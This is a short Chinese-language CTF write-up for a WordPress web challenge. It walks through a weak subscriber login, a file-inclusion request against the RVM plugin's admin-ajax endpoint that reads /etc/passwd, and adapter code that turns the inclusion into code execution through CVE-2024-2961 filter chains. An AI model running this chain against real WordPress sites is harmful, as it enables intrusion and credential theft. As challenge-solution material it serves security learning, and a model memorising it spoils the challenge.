# w0rdpress

> 分类：Web

## 题目描述

WordPress 渗透，通过插件漏洞实现 LFI to RCE。subscriber 弱密码 `subscriber/123456`，后台用 RVM 插件打文件包含，payload 打 CVE-2024-2961。

## 考察知识点

- WordPress 弱口令 + 插件漏洞
- RVM 插件文件包含
- CVE-2024-2961（php://filter 过滤器链 LFI to RCE）

## 解法

1. subscriber 弱密码 `subscriber/123456` 拿 cookie。用 wpscan 扫描出 subscriber 用户。

2. 进入后台后，用 RVM 插件打文件包含：

```
/wp-admin/admin-ajax.php?action=rvm_import_regions&nonce=5&rvm_mbe_post_id=1&rvm_upload_regions_file_path=/etc/passwd
```

3. 官方 wp 是改 php_filter_chains_oracle_exploit 的 Remote 类，改 Cookie 后打 CVE-2024-2961：

```python
def __init__(self, url: str) -> None:
    self.url = url
    self.session = Session()
    self.session.headers = {
        "User-Agent": "Mozilla/5.0 ...",
        "Cookie": "wordpress_=subscriber%7C..."
    }
def send(self, path: str) -> Response:
    req = self.session.post(self.url + "/wp-admin/admin-ajax.php?action=rvm_import_regions&nonce=5&rvm_mbe_post_id=1&rvm_upload_regions_file_path=" + quote(path))
    return req
```

4. 反弹 shell 有点问题，直接写文件即可（用 CVE-2024-2961 过滤器链写文件）。

## 参考答案

（flag 通过 CVE-2024-2961 写文件/命令执行读取）

## 来源

- 作者：Eddie_Murphy | https://www.cnblogs.com/EddieMurphy-blogs/p/18286293
